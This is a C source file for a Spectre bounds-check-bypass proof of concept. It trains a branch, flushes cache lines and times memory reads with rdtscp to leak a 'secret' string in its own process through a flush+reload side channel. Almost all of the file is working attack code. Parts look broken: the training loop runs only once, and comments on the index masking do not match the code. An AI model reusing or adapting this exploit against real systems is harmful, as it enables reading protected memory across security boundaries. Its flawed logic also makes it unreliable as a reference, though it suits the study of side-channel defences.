//Build with Visual Studio command prompt: cl.exe spectre.c
//Build with GCC: gcc spectre.c

#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define PAGE_NUM            256
#define CACHE_HIT_THRESHOLD 100

uint8_t array[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t mem_pages[PAGE_NUM][4096]; //unsigned 8bit 256pages 4kB, total 1MB

void do_speculative_execution(int index)
{
    _mm_clflush(array);
    for (volatile int z = 0; z < 100; z++);
    //printf("index: %d array: 0x%d\n",index,array[index]);
    if (index < sizeof(array))
    {
        mem_pages[array[index]][0] = 0;
    }
}

void speculative_execution(uint8_t* target, int tries)
{
    register int offset_to_array = (target - array);
    register size_t training_x, index;//unsigned long 8 Byte, register recommend this to be stored in regfiles
    training_x = tries % sizeof(array);
    for (int i = 0; i < 1; i++)
    {
        index = ((i % (sizeof(array)/2)) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, or i%8 = 0, else x=0 */
        //Becuase i%8 = 0, j = -1, makes index into -65536 = 0xFFFF0000, else index = 0;
        // printf("index %d i %d\n",index,i);
        index = (index | (index >> sizeof(array))); /* Set x=-1 if j&6=0, else x=0 */
        //set index = -1 if index = 0xFFFF0000. index = 0/-1
        // printf("inde2 %d i %d\n",index,i);
        index = training_x ^ (index & (offset_to_array ^ training_x));
        //index = 0, index = training_x. else index = -1, index = offset_to_array
        // printf("offset: %d index %d i %d\n",offset_to_array,index,i);
        do_speculative_execution(index);
    }
}

int get_access_time(uint8_t* page)
{
    unsigned long long tick1, tick2;
    unsigned int aux;

    tick1 = __rdtscp(&aux);
    uint8_t tmp = *page;
    tick2 = __rdtscp(&aux);
    
    return (tick2 - tick1);
}

void detect_cached_page(int results[PAGE_NUM])
{
    int min_time = 500;
    int cached_page_index = -1;
    //get the page number that acess uses least time
    for (int i = 0; i < PAGE_NUM; i++)
    {
        //Order is lightly mixed up to prevent stride prediction
        int mixed_i = ((i * 167) + 13) & 255;
        int access_time = get_access_time(mem_pages[mixed_i]);
        printf("access_time: %d i: %d\n",access_time,mixed_i);
        if (min_time > access_time)
        {
            min_time = access_time;
            cached_page_index = mixed_i;
        }
        //printf("mixed_i: %d min_time: %d cached_page_index: %d\n",mixed_i,min_time,cached_page_index);
    }
    //printf("cached_page_index %d\n",cached_page_index);
    if(-1 != cached_page_index)
    {
        results[cached_page_index]++;
    }
    // for (int i = 0; i < PAGE_NUM; i++)
    // {
    //     printf("results %d i: %d\n",results[i],i);
    // }
}

uint8_t get_best_result(int results[PAGE_NUM])
{
    uint8_t ret = '?';
    int max = 0;
    for (int i = 0; i < PAGE_NUM; i++)
    {
        if (results[i] > max)
        {   
            max = results[i];
            ret = i;
        }
    }
    //printf("%d, score0: %d\n", ret, results[ret]);
    if(ret < 32 || ret > 126) ret = 'x';
    //printf("%c, score: %d\n", ret, results[ret]);
    return ret;
}

uint8_t probe(uint8_t* target)
{
    //printf("target: %p\n",target);//traget is the start address of the array Hello eg.
    int results[PAGE_NUM];//4Byte 256 array
    memset(results, 0, sizeof(results));//access results, set to 0
    
    for (int tries = 0; tries < 300; tries++)
    {
        for (int i = 0; i < PAGE_NUM; i++)//flush all the mem_pages array from cache
        {
            _mm_clflush(mem_pages[i]);
        }

        speculative_execution(target, tries);

        detect_cached_page(results);
        // for (int i = 0; i < PAGE_NUM; i++)
        // {
        //     printf("results outside %d i: %d\n",results[i],i);
        // }
    }

    return get_best_result(results);
}

char *secret = "Hello";//char pointer

int main()
{
    memset(mem_pages, 1, sizeof(mem_pages));//fill array mem_pages with 1, accessed mem_pages

    int len = strlen((char*)(secret));// get the len of secret
    // secret = "World";
    // printf("%c\n",secret[0]);
    // printf("len %d\n",len);
    //printf("addr: %p\n",&secret[0]);//virtual address of the pointer
    // printf("addr: %p\n",secret);//virtual address of the array

    printf("secret = ");//sleep(1);
    
    for(int i = 0; i < 1; i++)
    {
        printf("%c", probe((uint8_t*)&secret[i]));//send the address of the array to probe
    }
    printf("\n");
}